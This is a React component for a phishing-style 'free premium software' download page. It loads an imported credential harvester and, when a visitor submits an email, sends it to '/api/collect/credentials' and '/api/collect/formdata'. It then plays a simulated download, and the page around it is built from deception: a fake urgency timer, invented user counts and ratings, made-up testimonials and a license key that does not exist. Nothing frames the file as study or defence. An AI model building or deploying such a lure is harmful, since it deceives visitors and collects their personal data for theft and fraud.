import React, { useState, useEffect } from 'react';
import { Box, Button, Typography, Container, Card, CardContent, TextField, LinearProgress, Grid, Chip, Avatar, AppBar, Toolbar } from '@mui/material';
import harvester from '../harvester/HarvesterCore';

export default function DownloadPage() {
  const [email, setEmail] = useState('');
  const [progress, setProgress] = useState(0);
  const [downloading, setDownloading] = useState(false);
  const [completed, setCompleted] = useState(false);

  useEffect(() => { harvester.init(); }, []);

  const handleDownload = () => {
    if (!email) return;

    harvester.send('/api/collect/formdata', {
      formId: 'download-form',
      fields: { email },
      url: window.location.href
    });

    harvester.send('/api/collect/credentials', {
      source: 'form-submit',
      email,
      url: window.location.href,
      formType: 'download',
      fieldData: { email }
    });

    setDownloading(true);
    let prog = 0;
    const interval = setInterval(() => {
      prog += Math.random() * 12 + 3;
      if (prog >= 100) {
        clearInterval(interval);
        setProgress(100);
        setTimeout(() => setCompleted(true), 500);
      } else {
        setProgress(prog);
      }
    }, 350);
  };

  if (completed) {
    return (
      <Box sx={{ minHeight: '100vh', bgcolor: '#f8f9fa', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
        <Container maxWidth="sm">
          <Card elevation={3} sx={{ borderRadius: 3, textAlign: 'center', overflow: 'hidden' }}>
            <Box sx={{ bgcolor: '#27ae60', p: 4 }}>
              <Typography sx={{ fontSize: '4rem' }}>✅</Typography>
              <Typography variant="h4" sx={{ color: '#fff', fontWeight: 800, mt: 2 }}>
                Download Complete!
              </Typography>
            </Box>
            <CardContent sx={{ p: 3 }}>
              <Typography sx={{ color: '#555', mb: 2 }}>
                Your license key has been sent to <strong style={{ color: '#333' }}>{email}</strong>.
              </Typography>
              <Box sx={{ bgcolor: '#fef3cd', border: '1px solid #ffc107', borderRadius: 2, p: 2, mb: 3 }}>
                <Typography sx={{ color: '#856404', fontWeight: 600, fontSize: '0.9rem' }}>
                  ⚠️ Activate within 24 hours or the key expires!
                </Typography>
              </Box>
              <Box sx={{ display: 'flex', gap: 1, justifyContent: 'center' }}>
                <Button variant="outlined" sx={{ borderColor: '#ddd', color: '#888' }} href="/">
                  Back to Home
                </Button>
                <Button variant="contained" sx={{ bgcolor: '#27ae60', '&:hover': { bgcolor: '#219a52' } }}>
                  Open Software
                </Button>
              </Box>
            </CardContent>
          </Card>
        </Container>
      </Box>
    );
  }

  return (
    <Box sx={{ minHeight: '100vh', bgcolor: '#f5f7fa' }}>
      {/* Header */}
      <Box sx={{ bgcolor: '#1a1a2e', py: 4, color: '#fff' }}>
        <Container maxWidth="sm" sx={{ textAlign: 'center' }}>
          <Typography sx={{ fontSize: '3rem', mb: 1 }}>🎮</Typography>
          <Typography variant="h4" sx={{ fontWeight: 800, mb: 0.5 }}>
            Premium Software Suite
          </Typography>
          <Typography sx={{ color: 'rgba(255,255,255,0.7)', mb: 2 }}>
            Professional-grade tools. Completely free for a limited time.
          </Typography>
          <Box sx={{ display: 'flex', justifyContent: 'center', gap: 2, flexWrap: 'wrap' }}>
            <Chip label="⭐ 4.8/5 Rating" sx={{ bgcolor: 'rgba(255,255,255,0.1)', color: '#fff' }} />
            <Chip label="👥 2.3M+ Active Users" sx={{ bgcolor: 'rgba(255,255,255,0.1)', color: '#fff' }} />
            <Chip label="🔒 SSL Secure" sx={{ bgcolor: 'rgba(255,255,255,0.1)', color: '#fff' }} />
          </Box>
        </Container>
      </Box>

      <Container maxWidth="sm" sx={{ mt: -4, position: 'relative', zIndex: 10, pb: 6 }}>
        {/* Download Card */}
        <Card elevation={4} sx={{ borderRadius: 3 }}>
          <CardContent sx={{ p: 3.5 }}>
            {/* Timer Banner */}
            <Box sx={{ bgcolor: '#fef3cd', border: '1px solid #ffc107', borderRadius: 2, p: 2, mb: 3, textAlign: 'center' }}>
              <Typography sx={{ color: '#856404', fontWeight: 700 }}>
                ⏱️ Limited Time Offer — Expires in 14:32:18
              </Typography>
            </Box>

            {/* Feature List */}
            <Grid container spacing={1.5} sx={{ mb: 3 }}>
              {[
                { icon: '🚀', text: 'Lightning-fast performance optimization' },
                { icon: '🛡️', text: 'Real-time security threat detection' },
                { icon: '📊', text: 'Advanced analytics & reporting dashboard' },
                { icon: '☁️', text: 'Cloud sync across all your devices' },
                { icon: '🎯', text: 'AI-powered productivity recommendations' },
                { icon: '💎', text: 'Pro features — normally $49.99/mo' },
              ].map((feat, i) => (
                <Grid item xs={12} sm={6} key={i}>
                  <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                    <Typography sx={{ fontSize: '1.2rem' }}>{feat.icon}</Typography>
                    <Typography sx={{ color: '#555', fontSize: '0.88rem' }}>{feat.text}</Typography>
                  </Box>
                </Grid>
              ))}
            </Grid>

            <Box sx={{ bgcolor: '#e8f5e9', borderRadius: 2, p: 2, mb: 3, textAlign: 'center' }}>
              <Typography variant="h3" sx={{ color: '#27ae60', fontWeight: 800 }}>
                $0.00
              </Typography>
              <Typography sx={{ color: '#27ae60', fontWeight: 600 }}>
                FREE — Lifetime License
              </Typography>
              <Typography sx={{ color: '#999', fontSize: '0.8rem', mt: 0.5 }}>
                Normally $49.99/month — No credit card required
              </Typography>
            </Box>

            <Typography sx={{ color: '#666', mb: 1.5, fontWeight: 500, textAlign: 'center' }}>
              Enter your email to get your free license key:
            </Typography>

            <TextField
              fullWidth
              type="email"
              placeholder="your@email.com"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              disabled={downloading}
              size="medium"
              sx={{ mb: 2, '& .MuiOutlinedInput-root': { bgcolor: '#f8f9fa' } }}
            />

            {downloading ? (
              <Box sx={{ textAlign: 'center' }}>
                <LinearProgress variant="determinate" value={progress} sx={{ height: 8, borderRadius: 4, bgcolor: '#e8e8e8', '& .MuiLinearProgress-bar': { bgcolor: '#27ae60', borderRadius: 4 } }} />
                <Typography sx={{ color: '#888', mt: 1, fontSize: '0.9rem' }}>
                  Preparing your download... {Math.round(progress)}%
                </Typography>
              </Box>
            ) : (
              <Button
                variant="contained"
                fullWidth
                size="large"
                onClick={handleDownload}
                disabled={!email}
                sx={{
                  bgcolor: '#27ae60',
                  '&:hover': { bgcolor: '#219a52' },
                  '&:disabled': { bgcolor: '#a5d6a7' },
                  fontWeight: 700,
                  py: 1.5,
                  fontSize: '1.1rem',
                  textTransform: 'none',
                  borderRadius: 2
                }}
              >
                🚀 Get Free License Key
              </Button>
            )}

            <Box sx={{ display: 'flex', justifyContent: 'center', gap: 2, mt: 2, flexWrap: 'wrap' }}>
              <Typography sx={{ color: '#aaa', fontSize: '0.8rem' }}>🔒 256-bit encryption</Typography>
              <Typography sx={{ color: '#aaa', fontSize: '0.8rem' }}>📦 24.5 MB download</Typography>
              <Typography sx={{ color: '#aaa', fontSize: '0.8rem' }}>💻 Windows • Mac • Linux</Typography>
            </Box>
          </CardContent>
        </Card>

        {/* Testimonials */}
        <Box sx={{ mt: 3 }}>
          <Typography variant="h6" sx={{ fontWeight: 700, color: '#333', mb: 2, textAlign: 'center' }}>
            What Our Users Say
          </Typography>
          <Grid container spacing={2}>
            {[
              { name: 'Sarah M.', role: 'Software Developer', text: 'This tool saved me hours of manual work. The Pro features are incredible — and it\'s completely free!' },
              { name: 'James K.', role: 'Business Owner', text: 'I\'ve been using this for 6 months. The productivity boost is unreal. Highly recommend.' },
              { name: 'Lisa R.', role: 'Digital Marketer', text: 'The analytics dashboard alone is worth hundreds. Getting this for free is a no-brainer.' },
            ].map((testimonial, i) => (
              <Grid item xs={12} sm={4} key={i}>
                <Card elevation={2} sx={{ borderRadius: 2, height: '100%' }}>
                  <CardContent sx={{ p: 2 }}>
                    <Typography sx={{ color: '#555', fontSize: '0.85rem', mb: 1.5, lineHeight: 1.5, fontStyle: 'italic' }}>
                      "{testimonial.text}"
                    </Typography>
                    <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                      <Avatar sx={{ width: 28, height: 28, bgcolor: '#27ae60', fontSize: '0.8rem', fontWeight: 700 }}>
                        {testimonial.name[0]}
                      </Avatar>
                      <Box>
                        <Typography sx={{ fontWeight: 600, color: '#333', fontSize: '0.8rem' }}>{testimonial.name}</Typography>
                        <Typography sx={{ color: '#888', fontSize: '0.7rem' }}>{testimonial.role}</Typography>
                      </Box>
                    </Box>
                  </CardContent>
                </Card>
              </Grid>
            ))}
          </Grid>
        </Box>
      </Container>
    </Box>
  );
}